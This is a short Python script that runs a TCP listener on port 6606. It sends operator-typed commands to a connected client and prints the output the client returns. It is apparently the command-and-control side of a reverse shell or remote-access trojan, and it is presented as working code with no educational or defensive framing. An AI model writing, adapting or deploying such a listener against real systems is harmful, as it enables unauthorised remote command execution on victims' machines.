import socket

def start_server(host='0.0.0.0', port=6606):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Server listening on {host}:{port}")

    client_socket, client_address = server.accept()
    print(f"Connection from {client_address} has been established!")

    while True:
        command = input("Enter command to execute: ")
        if command.lower() in ['exit', 'quit']:
            client_socket.send(command.encode())
            break
        client_socket.send(command.encode())

        result = b''
        while True:
            part = client_socket.recv(1024)
            result += part
            if len(part) < 1024:
                break

        try:
            print(result.decode('utf-8'))
        except UnicodeDecodeError:
            print(result.decode('latin-1'))

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
